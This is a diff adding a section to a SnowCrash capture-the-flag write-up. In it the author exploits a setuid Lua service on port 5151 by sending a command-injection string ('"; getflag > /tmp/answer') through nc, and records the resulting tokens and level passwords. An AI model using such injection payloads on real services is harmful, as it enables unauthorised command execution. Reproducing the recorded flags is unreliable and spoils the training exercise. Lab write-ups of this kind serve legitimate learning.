@@ -408,3 +408,25 @@ After a moment you can find this message `woupa2yuojeeaaed06riuj63c`.
 
 After that we have to log with `flag10` and give the password `woupa2yuojeeaaed06riuj63c`.
 When we are connected we just have to use `getflag`.
+
+## Level 11
+
+In this one, we have a [lua](https://fr.wikipedia.org/wiki/Lua) script.
+
+```bash
+level11@SnowCrash:~$ ls -l
+total 4
+-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
+```
+
+We see that the script ensures it is run on port 5151.
+
+```bash
+level11@SnowCrash:~$ nc localhost 5151
+Password: "; getflag > /tmp/answer"
+Erf nope..
+level11@SnowCrash:~$ cat /tmp/answer
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+```
+
+After that we have to log with `level12` and give the password `fa6v5ateaw21peobuub8ipe6s`.
